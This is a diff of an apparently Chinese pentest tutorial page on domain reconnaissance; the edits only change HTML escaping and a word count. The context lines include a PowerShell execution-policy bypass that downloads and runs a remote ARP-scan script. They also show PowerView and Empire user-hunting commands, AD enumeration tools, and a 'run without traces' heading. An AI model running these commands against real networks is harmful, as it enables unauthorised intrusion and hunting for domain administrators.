@@ -703,10 +703,10 @@ execute
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>3.NiShang里面的脚本: <code>Invoke-ARPScan.ps1</code> </p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># a.远程下载运行</span>
-powershell -nop -exec bypass -c <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20"</span> <span class="token operator">&gt;&gt;</span> C:\windows\temp\log.txt
+powershell -nop -exec bypass -c <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20"</span> <span class="token operator">>></span> C:\windows\temp\log.txt
 
 <span class="token comment" spellcheck="true"># b.本地运行(先上传脚本到目标)</span>
-powershell.exe -nop -exec bypass -Command <span class="token string">"&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}"</span> <span class="token operator">&gt;&gt;</span> C:\windows\temp\log.txt
+powershell.exe -nop -exec bypass -Command <span class="token string">"&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}"</span> <span class="token operator">>></span> C:\windows\temp\log.txt
 
 <span class="token comment" spellcheck="true"># c.无条件运行(没痕迹)</span>
 
@@ -841,7 +841,7 @@ psloggedon \\DC1
 <span class="token comment" spellcheck="true"># 可用于查找活动目录</span>
 <span class="token comment" spellcheck="true"># 需要 .net 2.0, 且 需管理员权限</span>
 
-PVEFindADUser.exe  <span class="token operator">&lt;</span>参数<span class="token operator">&gt;</span>
+PVEFindADUser.exe  <span class="token operator">&lt;</span>参数<span class="token operator">></span>
 <span class="token comment" spellcheck="true"># </span>
 PVEFindADUser.exe  --current   <span class="token comment" spellcheck="true"># 显示域中所有计算机上当前登录的用户</span>
 PVEFindADUser.exe  --last   <span class="token comment" spellcheck="true"># 显示域中目标计算机上最后登录的用户</span>
@@ -851,7 +851,7 @@ PVEFindADUser.exe  --last   <span class="token comment" spellcheck="true"># 显�
 <p>4.netsess.exe                        </p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 枚举工具</span>
 
-netsess.exe  <span class="token operator">&lt;</span>参数<span class="token operator">&gt;</span>
+netsess.exe  <span class="token operator">&lt;</span>参数<span class="token operator">></span>
 <span class="token comment" spellcheck="true"># -f file.txt   指定要提取主机列表的文件</span>
 <span class="token comment" spellcheck="true"># -e file.txt   指定要排除的主机名的文件</span>
 <span class="token comment" spellcheck="true"># -o file.txt   将所有输出都重定向到指定的文件</span>
@@ -881,7 +881,7 @@ smb-os-discovery.nse    <span class="token comment" spellcheck="true"># 收集�
 powershell -nop -exec bypass -Command <span class="token string">"&amp; {Import-Module .\PowerView.ps1; Invoke-UserHunter}"</span> 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>8.Empire下<code>user_hunter</code>模块</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 也有类似Invoke-UserHunter的模块： user_hunter   --&gt; 用于查找域管理员登录的机器</span>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 也有类似Invoke-UserHunter的模块： user_hunter   --> 用于查找域管理员登录的机器</span>
 usemodule situational_awareness/network/powerview/user_hunter
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程 "></a><font color="red">查找域管理进程 </font></h4><p>如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径</p>
@@ -1651,7 +1651,7 @@ DMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中�
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">326.3k</span>&nbsp;字
+                class="white-color">326.7k</span>&nbsp;字
             
             
             
